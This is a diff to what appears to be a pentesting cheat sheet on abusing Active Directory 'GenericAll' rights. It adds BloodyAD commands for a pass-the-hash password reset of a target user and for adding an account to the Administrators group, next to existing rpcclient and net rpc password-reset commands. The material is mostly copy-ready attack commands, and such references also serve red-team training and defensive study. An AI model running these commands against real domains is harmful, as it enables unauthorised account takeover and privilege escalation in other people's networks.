@@ -12,6 +12,12 @@
 
 If you have **GenericAll** over a user object, you can reset their password without knowing the old one.
 
+- Using **BloodyAD**:
+
+```bash
+bloodyAD --host 172.16.1.15 -d bloody.local -u jane.doe -p :NTLMHASH set password targetuser NewPass123!
+```
+
 - Using **impacket** (`rpcclient` or `net`):
 
 ```bash
@@ -19,11 +25,12 @@ rpcclient -U <your_user>%<your_pass> <dc_ip>
 rpcclient $> setuserinfo2 <target_user> 23 '<NewPassword>'
 ```
 
-- Or with **net rpc**:
+- Using **net rpc**:
 
 ```bash
 net rpc password <target_user> <NewPassword> -U <your_user>%<your_pass> -S <dc_ip>
 ```
+
 
 After this, you can authenticate as `<target_user>` with the new password.
 
@@ -32,6 +39,12 @@ After this, you can authenticate as `<target_user>` with the new password.
 ### 2. Add Yourself to a Group
 
 If you have **GenericAll** over a group object, you can add your account to that group.
+
+- With **BloodyAD**:
+
+```bash
+bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :NTLMHASH add groupMember 'Administrators' test
+```
 
 - With **rpcclient**:
 
